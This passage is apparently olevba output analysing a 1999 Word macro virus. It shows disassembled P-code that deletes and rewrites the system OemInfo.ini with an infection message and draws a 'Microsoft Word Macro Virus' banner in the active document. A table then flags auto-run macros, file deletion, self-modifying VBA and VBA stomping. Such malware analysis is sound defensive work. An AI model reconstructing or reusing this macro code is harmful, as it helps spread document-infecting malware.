' 	EndIfBlock 
' 	BoS 0x0000 
' 	EndSub 
' Line #140:
' Line #141:
' 	FuncDefn (Private Sub AddOemInfo())
' 	BoS 0x0000 
' 	OnError (Resume Next) 
' Line #142:
' 	LitStr 0x0005 "Paths"
' 	LitStr 0x0006 "WinDir"
' 	LitStr 0x000C "C:\MsDos.sys"
' 	Ld WordBasic 
' 	ArgsMemLd GetPrivateProfileString 0x0003 
' 	LitStr 0x0013 "\System\OemInfo.ini"
' 	Concat 
' 	St fn 
' Line #143:
' 	Ld fn 
' 	Paren 
' 	ArgsCall Kill 0x0001 
' 	BoS 0x0000 
' 	Ld fn 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #144:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "[General]"
' 	PrintItemNL 
' Line #145:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0018 "Manufacturer=ДВЮИ МВД РФ"
' 	PrintItemNL 
' Line #146:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0013 "Model=MS Word Вирус"
' 	PrintItemNL 
' Line #147:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0015 "[Support Information]"
' 	PrintItemNL 
' Line #148:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0021 "Line1=Компьютер заражен вирусом: "
' 	Ld VrName 
' 	Add 
' 	PrintItemNL 
' Line #149:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "Line2="
' 	PrintItemNL 
' Line #150:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0013 "Line3=Vr Technology"
' 	PrintItemNL 
' Line #151:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0029 "Line4=John Great, ДВЮИ МВД РФ - (C) '1999"
' 	PrintItemNL 
' Line #152:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' 	BoS 0x0000 
' 	EndSub 
' Line #153:
' Line #154:
' 	FuncDefn (Private Sub CreateImageScreen())
' 	BoS 0x0000 
' 	OnError (Resume Next) 
' Line #155:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt ScreenUpdating 
' 	BoS 0x0000 
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #156:
' 	Ld ActiveDocument 
' 	MemLd ProtectionType 
' 	Ld wdNoProtection 
' 	Eq 
' 	IfBlock 
' Line #157:
' 	Ld ActiveDocument 
' 	MemLd PageSetup 
' 	MemLd PageWidth 
' 	LitDI2 0x019A 
' 	Sub 
' 	Paren 
' 	LitDI2 0x0002 
' 	Div 
' 	St x0 
' 	BoS 0x0000 
' 	Ld ActiveDocument 
' 	MemLd PageSetup 
' 	MemLd TopMargin 
' 	St y0 
' Line #158:
' 	SetStmt 
' 	Ld msoShapeRoundedRectangle 
' 	Ld x0 
' 	Ld y0 
' 	LitDI2 0x019A 
' 	LitDI2 0x0082 
' 	Ld ActiveDocument 
' 	MemLd Shapes 
' 	ArgsMemLd AddShape 0x0005 
' 	Set aShape 
' Line #159:
' 	StartWithExpr 
' 	Ld aShape 
' 	With 
' Line #160:
' 	Ld msoTrue 
' 	MemLdWith Fill 
' 	MemSt Visible 
' Line #161:
' 	LitDI2 0x00FF 
' 	LitDI2 0x00FF 
' 	LitDI2 0x00FF 
' 	ArgsLd RSet 0x0003 
' 	MemLdWith Fill 
' 	MemLd ForeColor 
' 	MemSt RSet 
' Line #162:
' 	LitR8 0x0000 0x0000 0x0000 0x3FE0 
' 	MemLdWith Fill 
' 	MemSt Transparency 
' Line #163:
' 	Ld msoGradientHorizontal 
' 	LitDI2 0x0004 
' 	LitR8 0x3D71 0xD70A 0x70A3 0x3FCD 
' 	MemLdWith Fill 
' 	ArgsMemCall OneColorGradient 0x0003 
' Line #164:
' 	Ld msoBringInFrontOfText 
' 	ArgsMemCallWith ZOrder 0x0001 
' Line #165:
' 	MemLdWith TextFrame 
' 	MemLd TextRange 
' 	ArgsMemCall Set 0x0000 
' Line #166:
' 	StartWithExpr 
' 	Ld Selection 
' 	With 
' Line #167:
' 	Ld wdEnglishUS 
' 	MemStWith LanguageID 
' Line #168:
' 	Ld wdAlignParagraphCenter 
' 	MemLdWith ParagraphFormat 
' 	MemSt Alignment 
' Line #169:
' 	LitVarSpecial (True)
' 	MemLdWith Font 
' 	MemSt Bold 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	MemLdWith Font 
' 	MemSt Italic 
' Line #170:
' 	LitStr 0x000F "Times New Roman"
' 	MemLdWith Font 
' 	MemSt New 
' 	BoS 0x0000 
' 	LitDI2 0x0014 
' 	MemLdWith Font 
' 	MemSt Size 
' Line #171:
' 	LitStr 0x001A "Microsoft Word Macro Virus"
' 	ParamNamed Then 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #172:
' 	LitVarSpecial (True)
' 	MemLdWith Font 
' 	MemSt Italic 
' 	BoS 0x0000 
' 	LitDI2 0x000E 
' 	MemLdWith Font 
' 	MemSt Size 
' Line #173:
' 	Ld vbCr 
' 	LitStr 0x000C "VrTechnoCode"
' 	Add 
' 	Ld vbCr 
' 	Add 
' 	ParamNamed Then 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #174:
' 	LitVarSpecial (False)
' 	MemLdWith Font 
' 	MemSt Italic 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	MemLdWith Font 
' 	MemSt Bold 
' 	BoS 0x0000 
' 	LitDI2 0x000A 
' 	MemLdWith Font 
' 	MemSt Size 
' Line #175:
' 	Ld wdAlignParagraphLeft 
' 	MemLdWith ParagraphFormat 
' 	MemSt Alignment 
' Line #176:
' 	LitStr 0x000A "- Word 7.0"
' 	Ld vbCr 
' 	Add 
' 	LitStr 0x0014 "- Stealth Technology"
' 	Add 
' 	Ld vbCr 
' 	Add 
' 	LitStr 0x0020 "- Infect Documents and Templates"
' 	Add 
' 	Ld vbCr 
' 	Add 
' 	Ld vbCrLf 
' 	Add 
' 	ParamNamed Then 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #177:
' 	Ld wdAlignParagraphCenter 
' 	MemLdWith ParagraphFormat 
' 	MemSt Alignment 
' Line #178:
' 	LitVarSpecial (True)
' 	MemLdWith Font 
' 	MemSt Italic 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	MemLdWith Font 
' 	MemSt Bold 
' 	BoS 0x0000 
' 	LitDI2 0x000E 
' 	MemLdWith Font 
' 	MemSt Size 
' Line #179:
' 	LitStr 0x003D "Copyright by John Great from Russia Far East, Khabarovsk'1999"
' 	ParamNamed Then 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #180:
' 	EndWith 
' 	BoS 0x0000 
' 	EndWith 
' Line #181:
' 	StartWithExpr 
' 	Ld msoShapeExplosion1 
' 	Ld x0 
' 	LitDI2 0x00E1 
' 	Add 
' 	Ld y0 
' 	LitDI2 0x0019 
' 	Add 
' 	LitDI2 0x00B4 
' 	LitDI2 0x0048 
' 	Ld ActiveDocument 
' 	MemLd Shapes 
' 	ArgsMemLd AddShape 0x0005 
' 	With 
' Line #182:
' 	LitR8 0x0000 0x0000 0x8000 0x4066 
' 	ArgsMemCallWith IncrementRotation 0x0001 
' Line #183:
' 	Ld msoTrue 
' 	MemLdWith Fill 
' 	MemSt Visible 
' Line #184:
' 	Ld msoGradientHorizontal 
' 	LitDI2 0x0001 
' 	Ld msoGradientFire 
' 	MemLdWith Fill 
' 	ArgsMemCall PresetGradient 0x0003 
' Line #185:
' 	Ld msoSendBehindText 
' 	ArgsMemCallWith ZOrder 0x0001 
' Line #186:
' 	MemLdWith TextFrame 
' 	MemLd TextRange 
' 	ArgsMemCall Set 0x0000 
' Line #187:
' 	StartWithExpr 
' 	Ld Selection 
' 	With 
' Line #188:
' 	LitVarSpecial (True)
' 	MemLdWith Font 
' 	MemSt Bold 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	MemLdWith Font 
' 	MemSt Italic 
' Line #189:
' 	Ld wdAlignParagraphCenter 
' 	MemLdWith ParagraphFormat 
' 	MemSt Alignment 
' Line #190:
' 	LitStr 0x000F "Times New Roman"
' 	MemLdWith Font 
' 	MemSt New 
' 	BoS 0x0000 
' 	LitDI2 0x0010 
' 	MemLdWith Font 
' 	MemSt Size 
' Line #191:
' 	LitStr 0x0008 "Version "
' 	Ld VrVersion 
' 	Concat 
' 	ParamNamed Then 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #192:
' 	EndWith 
' Line #193:
' 	Ld aShape 
' 	MemLd New 
' 	MemLdWith New 
' 	ArgsArray Array 0x0002 
' 	Ld ActiveDocument 
' 	MemLd Shapes 
' 	ArgsMemLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #194:
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Group 
' 	ArgsMemCall Set 0x0000 
' 	BoS 0x0000 
' 	Ld ActiveDocument 
' 	ArgsMemCall UndoClear 0x0000 
' Line #195:
' 	EndWith 
' 	BoS 0x0000 
' 	EndIfBlock 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	UMi 
' 	Ld Application 
' 	MemSt ScreenUpdating 
' 	BoS 0x0000 
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |autoexec.bat        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

